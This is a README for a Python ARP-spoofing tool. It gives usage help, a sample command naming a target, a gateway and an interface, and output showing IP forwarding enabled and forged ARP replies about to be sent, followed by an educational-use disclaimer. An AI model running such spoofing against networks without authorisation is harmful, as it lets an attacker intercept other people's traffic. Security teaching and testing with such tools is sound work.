# ARP Spoofer
Python 3.9+ is required, tested on Kali Linux.

## Example Usage
```shell
python3 arpspoof.py -h
    _    ____  ____    ____                     __           
   / \  |  _ \|  _ \  / ___| _ __   ___   ___  / _| ___ _ __ 
  / _ \ | |_) | |_) | \___ \| '_ \ / _ \ / _ \| |_ / _ \ '__|
 / ___ \|  _ <|  __/   ___) | |_) | (_) | (_) |  _|  __/ |   
/_/   \_\_| \_\_|     |____/| .__/ \___/ \___/|_|  \___|_|   
                            |_|                              

usage: arpspoof.py [-h] target gateway interface

positional arguments:
  target      Please specify Target IP address
  gateway     Please specify default Gateway IP address
  interface   Please specify the Interface

optional arguments:
  -h, --help  show this help message and exit
```

```shell
python3 arpspoof.py 192.168.0.17 192.168.0.1 wlan0
```

Output
```
    _    ____  ____    ____                     __           
   / \  |  _ \|  _ \  / ___| _ __   ___   ___  / _| ___ _ __ 
  / _ \ | |_) | |_) | \___ \| '_ \ / _ \ / _ \| |_ / _ \ '__|
 / ___ \|  _ <|  __/   ___) | |_) | (_) | (_) |  _|  __/ |   
/_/   \_\_| \_\_|     |____/| .__/ \___/ \___/|_|  \___|_|   
                            |_|                              

[*] Enabling IP forwarding.
[+] Gateway 192.168.0.1 is at ac:22:05:4f:f9:1f
[+] Target 192.168.0.17 is at a4:71:74:43:f9:0f
[*] Prepare to send to 192.168.0.17: 192.168.0.1 is at 34:f6:4b:06:0c:f7
[*] Prepare to send to 192.168.0.1: 192.168.0.17 is at 34:f6:4b:06:0c:f7
[+] Beginning ARP Spoofing. [CTRL+C to stop]
```

## Disclaimer
All information and software available in this probject are for educational purposes only. Use these at your own discretion, the author cannot be held responsible for any damages caused. Usage of these tools for attacking targets without prior mutual consent is illegal.